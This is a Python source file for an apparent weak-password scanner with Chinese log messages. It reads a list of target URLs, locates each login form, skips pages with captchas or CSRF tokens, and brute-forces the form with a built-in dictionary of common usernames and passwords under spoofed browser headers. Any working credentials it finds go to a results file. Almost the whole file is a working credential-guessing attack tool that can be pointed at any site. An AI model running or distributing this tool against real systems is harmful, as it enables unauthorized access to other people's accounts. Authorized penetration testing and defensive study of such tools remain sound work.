import os
import random
import re
import urllib
import datetime

import requests
from bs4 import BeautifulSoup as BS

# r = requests.get('https://49.235.204.174/')
from weakpwd import report

nowtime = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
starttime = nowtime
endtime = nowtime
# global exception_count
exception_count = 1

error_log = open(str('weakpwd_error_' + nowtime + '.txt'), 'w+', encoding='utf-8')
log = open(str('weakpwd_log_' + nowtime + '.txt'), 'w+', encoding='utf-8')
ok = open(str('weakpwd_ok_' + nowtime + '.txt'), 'w+', encoding='utf-8')
# global report_success,report_warning
report_success = {'什么也没破解到': ''}
report_warning = {}

# with open('dict.txt','r') as f:
#     line=f.read().strip()
#     PASSWORD = line.split('\n')
USERNAME = ['admin', 'guest', 'test', 'ceshi', 'system']
PASSWORD = ['1234567', '123456', 'admin', 'password', '123123', '123', '1', '{user}', '{user}{user}', '{user}1',
            '{user}123',
            '{user}123456',
            '{user}2018', '{user}2017', '{user}2016', '{user}2015', '{user}!', 'P@ssw0rd!!', 'qwa123', '12345678',
            'test', '123qwe!@#', '123456789', '123321', '1314520', '666666', 'woaini', '000000', '1234567890',
            '8888888', 'qwerty', '1qaz2wsx', 'abc123', 'abc123456', '1q2w3e4r', '123qwe', 'a123456', 'p@ssw0rd',
            'a123456789', 'woaini1314', 'qwerasdf', '123456a', '123456789a', '987654321', 'qwer!@#$', '5201314520',
            'q123456', '123456abc', '123123123', '123456.', '0123456789', 'asd123456', 'aa123456', 'q123456789',
            '!QAZ@WSX', '12345', '1234567', 'passw0rd', 'admin888', ]
# with open('dict.txt', 'r') as f:
#     line = f.read().strip()
#     PASSWORD.extend(line.split('\n'))
# PASSWORD = list(set(PASSWORD))


# USERNAME = ['biing']
# PASSWORD = ['5887568', '123456', 'admin', '111111', 'password', '123123', '123', '1', '{user}']


def request_headers():
    UA_list = [
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Mozilla/5.0(Windows NT 10.0;Win64;x64;rv: 71.0) Gecko / 20100101 Firefox / 71.0', ]
    UA = random.choice(UA_list)
    UA = UA_list[11]
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Upgrade-Insecure-Requests': '1',
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'User-Agent': UA,
        "Referer": "http://www.baidu.com/",
        'Accept-Language': 'zh-CN,zh;q=0.8,en;q = 0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    # headers = {
    #     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0',
    #     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    #     'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.2',
    #     'Accept-Encoding': 'gzip, deflate',
    #     'Connection': 'keep-alive',
    #     'Upgrade-Insecure-Requests': '1',
    #     'Cache-Control': 'max-age=0',
    #     'Content-Type': 'application/x-www-form-urlencoded',
    # }
    return headers


def requests_proxies():
    proxies = {
        # 'http':'127.0.0.1:8080',
        # 'https':'127.0.0.1:8080'
    }
    return proxies


def get_form_title(url):
    r = requests.get(url, headers=request_headers(), timeout=10, verify=False)
    if r.status_code != 200 and r.status_code != 304 and r.status_code != 301 and r.status_code != 308:
        print("对于URL：{}的访问得到的响应状态码不为200/304/301/308，而是{},访问可能出错，跳过".format(url, r.status_code))
        log.write(u"??  对于URL：{}的访问得到的响应状态码不为200/304/301/308，而是{}".format(url, r.status_code) + '\n')
        report_warning['访问出错'] = u"??  对于URL：{}的访问得到的响应状态码不为200/304/301/308，而是{}".format(url, r.status_code)
        return '', ''
    r.encoding = r.apparent_encoding
    soup = BS(r.text, 'lxml')
    result = soup.find_all('form')
    verify_code = ['验证码', '点击更换', '点击刷新', 'checkcode', '看不清', 'captcha']
    csrftoken = ['csrf', 'token', ]
    search_bar = ['检索', '搜', 'search', '查找', 'keyword', '关键字']
    for i in search_bar:
        if i in r.text:
            print("在URL: {}中发现可能是搜索界面，跳过。", url)
            log.write(u"??  ||在" + url + "中发现有搜索界面，跳过\n")
            report_warning['搜索界面'] = u"??  ||在" + url + "中发现有搜索界面，跳过"
            return '', 'search'
    for i in verify_code:
        if i in r.text:
            print("在URL: {}中发现有验证码:{}，跳过。".format(url, i))
            log.write(u"??  ||在" + url + "中发现有验证码：" + i + "跳过\n")
            report_warning['验证码'] = u"??  ||在" + url + "中发现有验证码：" + i + "跳过"
            return '', 'captcha'
    for i in csrftoken:
        if i in r.text:
            print("在URL: {}中发现有token项，跳过。\n".format(url))
            log.write(u"??  ||在" + url + "中发现有token项：" + i + "跳过\n")
            report_warning['csrf'] = u"??  ||在" + url + "中发现有csrf防护措施：" + i + "跳过\n"
            return '', 'token'
    try:
        title = soup.title.text
    except:
        title = ''
    # print(soup.form)
    # result = re.findall(".*<form(.*)</form>", r.text, re.S)

    if result:
        form_data = str(soup.form).strip()
        form_soup = BS(form_data, 'lxml')
        form = form_soup.form
        return form, title
    else:
        return '', ''


def get_data(form):
    global id
    data = {}
    user_key = ''
    pwd_key = ''
    flag = False
    id_name_list = ['name', 'id']
    for item in form.find_all('input'):
        for id_item in id_name_list:
            if item.has_attr(id_item):
                id = item[id_item]
                break
            else:
                id = ''

        if item.has_attr('value'):
            value = item['value']
        else:
            value = '0000'

        if id:
            if not user_key:
                for i in ['username', 'name', 'account', 'yonghu', 'id_username', 'email', 'yonghu']:
                    if i in id.lower():
                        value = '{user_name}'
                        user_key = id
                        break
            if not flag:
                for i in ['password', 'pwd', 'mima', 'id_password']:
                    if i in id.lower():
                        value = '{pass_word}'
                        pwd_key = id
                        flag = True
                        break
            data[id] = str(value)

    else:
        return urllib.parse.urlencode(data), user_key, pwd_key


def join_url_path(s1, s2):
    global i
    length1 = len(s1)
    length = min(length1, len(s2))
    for i in range(length, -1, -1):
        if s1[length1 - i:] == s2[:i]:
            break
    return s1 + s2[i:]


def get_post_page(form, url):
    form_content = str(form).split('\n')[0]
    soup = BS(form_content, 'lxml')

    url_path = ''
    for i in re.findall(".*?/", url):
        url_path = url_path + i

    action_url = soup.form['action']
    if str(action_url).startswith('http'):
        path = action_url
    else:
        path = url_path + '/' + soup.form['action']

    return path


def get_error(csession, data, path):
    data1 = data
    error_flag_cookie, dynamic_request = False, False
    data2 = str(data1.replace('%7Buser_name%7D', 'admin'))
    data2 = str(data2.replace('%7Bpass_word%7D', 'cantbethepwd'))

    response_test = csession.post(url=path, data=data2, headers=request_headers(), allow_redirects=True, timeout=10,
                                  verify=False, proxies=requests_proxies())
    response2 = csession.post(url=path, data=data2, headers=request_headers(), allow_redirects=True, timeout=10,
                              verify=False, proxies=requests_proxies())
    response = csession.post(url=path, data=data2, headers=request_headers(), allow_redirects=True, timeout=10,
                             verify=False, proxies=requests_proxies())
    # response.encoding = response.apparent_encoding
    # response2.encoding = response2.apparent_encoding
    error_length_test = len(response_test.text + str(response_test.headers))
    error_length_2 = len(str(response2.text) + str(response2.headers))
    error_length = len(str(response.text) + str(response.headers))

    if error_length != error_length_2:
        dynamic_request = True
    if 'Set-Cookie' in response2.headers:
        error_flag_cookie = True

    return error_length_2, error_flag_cookie, dynamic_request,

    # data1 = data
    # cookie_error_flag = 0
    # dynamic_req_len = 0
    # data2 = str(data1.replace('%7Buser_name%7D', 'admin'))
    # data2 = str(data2.replace('%7Bpass_word%7D', 'length_test'))
    # res_test = conn.post(url=path, data=data2, headers=random_headers(), timeout=10, verify=False,
    #                      allow_redirects=True, proxies=requests_proxies())  # 先请求一次
    # res_02 = conn.post(url=path, data=data2, headers=random_headers(), timeout=10, verify=False,
    #                    allow_redirects=True, proxies=requests_proxies())
    # res_02.encoding = res_02.apparent_encoding
    # res = conn.post(url=path, data=data2, headers=random_headers(), timeout=10, verify=False, allow_redirects=True,
    #                 proxies=requests_proxies())
    # res.encoding = res.apparent_encoding
    # error_length_02 = len(res_02.text + str(res_02.headers))
    # error_length = len(res.text + str(res.headers))
    # if error_length_02 != error_length:
    #     dynamic_req_len = 1
    # if 'Set-Cookie' in res.headers:
    #     cookie_error_flag = 1
    # return error_length, cookie_error_flag, dynamic_req_len


def exception_cnt(exception_count):
    a = exception_count
    exception_count += 1
    return a


def crack(data, path, user_key, pwd_key):
    try:
        se = requests.session()
        error_length, error_flag_cookie, dynamic_request = get_error(se, data, path)
        if dynamic_request:
            return False, False

        success_flag = False
        try_cnt = 0
        right_pass = True

        dict_all = len(USERNAME) * len(PASSWORD)
        blacklist = ['密码错误', '重试', '不正确', '密码有误', '不成功', '重新输入', 'wrong', '不存在', '登录失败', '登陆失败', '出错',
                     '已被锁定', 'invalid', '安全拦截', '还可以尝试', '无效',
                     '非法', '不合法', 'Denied', 'failed', 'fail', 'deny', ]
        print('字典总数：' + str(dict_all) + "  正在尝试……")
        for user_name in USERNAME:
            for pass_word in PASSWORD:
                data1 = data
                user_name = user_name.strip()
                pass_word = pass_word.strip()

                try_cnt += 1
                pass_word = str(pass_word.replace('{user}', user_name))
                data2 = str(data1.replace('%7Buser_name%7D', urllib.parse.quote(user_name)))
                data2 = str(data2.replace('%7Bpass_word%7D', urllib.parse.quote(pass_word)))
                # print(
                #     '字典总数：' + str(dict_all) + '当前：' + str(try_cnt) + 'account:' + user_name + ' password:' + pass_word)
                response = se.post(url=path, data=data2, headers=request_headers(), timeout=10, verify=False,
                                   allow_redirects=True)
                response.encoding = response.apparent_encoding
                res_length = len(str(response.content) + str(response.headers))
                right_pass = True
                html = response.text + str(response.headers)
                for i in blacklist:
                    if i.lower() in html.lower():
                        right_pass = False
                        break
                if right_pass:
                    if user_key:
                        if user_key in response.text:
                            continue
                        elif pwd_key:
                            if pwd_key in response.text:
                                continue
                    if res_length != error_length:
                        success_flag = True
                        return user_name, pass_word
                    # elif 'Set-Cookie' in response.headers and res_length != error_length and not error_flag_cookie:
                    #     success_flag = True
                    #     return user_name, pass_word
                else:
                    continue
        if not success_flag:
            return False, False
    except Exception as e:
        error_log.write(u'在破解密码时出现异常：' + str(e) + '\n')
        print('在破解密码时出现异常：', e)
        report_warning['异常' + str(exception_cnt(exception_count))] = '在破解密码时出现异常：' + str(e)


def recheck(data, path, user_name, pass_word):
    data1 = data
    session = requests.session()
    pass_word = str(pass_word.replace('{user}', user_name))
    data_wrong = str(data1.replace('%7Buser_name%7D', user_name))
    data_wrong = str(data_wrong.replace('%7Bpass_word%7D', 'cantbethepwd'))
    data_test = str(data1.replace('%7Buser_name%7D', user_name))
    data_test = str(data_test.replace('%7Bpass_word%7D', pass_word))

    response_wrong = session.post(url=path, data=data_wrong, headers=request_headers(), timeout=10, verify=False,
                                  allow_redirects=False, )
    response_test = session.post(url=path, data=data_test, headers=request_headers(), timeout=10, verify=False,
                                 allow_redirects=False, )
    response_wrong.encoding = response_wrong.apparent_encoding
    response_test.encoding = response_test.apparent_encoding
    error_length_wrong = len(str(response_wrong.content) + str(response_wrong.headers))
    error_length_test = len(str(response_test.content) + str(response_test.headers))
    if error_length_wrong != error_length_test:
        return True
    else:
        return False


def proccess(url):
    try:
        form, form_title = get_form_title(url)
        login_sign = ['user', 'password', 'account', 'login', '登录', '用户名', '密码', '账号', '账户', '口令', '登陆', '登录名', '账户名']
        login_form_flag = False
        if form_title == 'search' or form_title == 'captcha' or form_title == 'token':
            print("在URL" + url + "中因为" + form_title + "而终止了破解")
            log.write(u"??  ||在URL" + url + "中因为" + form_title + "而终止了破解\n")

            return
        if form:
            for login in login_sign:
                if login in str(form):
                    login_form_flag = True
                    break
            if not login_form_flag:
                print("在URL" + url + "中找到了表单，但是没有发现登录表单\n")
                log.write(u"?? || 在URL" + url + "中找到了表单，但是没有发现登录表单\n")
                report_warning['没发现表单'] = u"?? || 在URL" + url + "中找到了表单，但是没有发现登录表单"
                form = ''
        else:
            print("在URL:  " + url + "中没找到表单！\n")
        if form:
            data, user_key, pwd_key = get_data(form)
            if data:
                print("正在尝试：" + url)
                path = get_post_page(form, url)
                user_name, pass_word = crack(data, path, user_key, pwd_key)
                recheck_flag = True
                if user_name or pass_word:
                    print("再次验证：", url, user_name, pass_word)
                    recheck_flag = recheck(data, path, user_name, pass_word)
                else:
                    recheck_flag = False

                if recheck_flag:
                    log.write(u"!!! 发现弱密钥:" + url + '\t' + user_name + '/' + pass_word + '\n')
                    ok.write(url + '\t' + user_name + '/' + pass_word + '\n')
                    print("!!! 发现弱密钥:" + url + '\t' + user_name + '/' + pass_word)
                    report_success.pop('什么也没破解到', '')
                    report_success[url] = u'账户：' + user_name + u" 密钥：" + pass_word
                else:
                    print(" :( 破解失败：URL:", url)
                    report_warning['失败！URL' + str(num + 1)] = u" 破解失败：URL:" + url

    except Exception as e:
        error_log.write(u'出现异常！' + str(e) + '\n')
        print('出现异常！' + str(e))
        report_warning['异常' + str(exception_cnt(exception_count))] = '在破解密码时出现异常：' + str(e)


if __name__ == "__main__":
    url_file_name = 'url.txt'
    # usage = '''python weakpwd_original.py url.txt   url.txt是目标URL地址'''
    # if len(sys.argv) == 2:
    #     url_file_name = sys.argv[1]
    # else:
    #     print(usage)
    #     exit(0)
    try:
        url_list = []
        if os.path.exists(url_file_name):
            url_file = open(url_file_name, 'r')
        else:
            print(url_file_name + " does not exist!")
            exit(0)
        for url in url_file.readlines():
            url = url.strip()
            if url.startswith('#'):
                continue
            url_list.append(url)
        url_all = len(url_list)
        print('总共有' + str(url_all) + '个网址等待扫描，准备开始')
        finish_flag = False
        num = 0
        while num != url_all:
            print("正在处理第{}个网址，还有{}个。。。".format(num + 1, url_all - num - 1))
            url = url_list[num].strip()
            proccess(url)
            num += 1
        log.close()
        ok.close()
        error_log.close()
        endtime = datetime.datetime.now()
        report.test()
    except Exception as e:
        error_log.write(u'出现异常！' + str(e) + '\n')
        print('出现异常！' + str(e))
        log.close()
        ok.close()
        error_log.close()
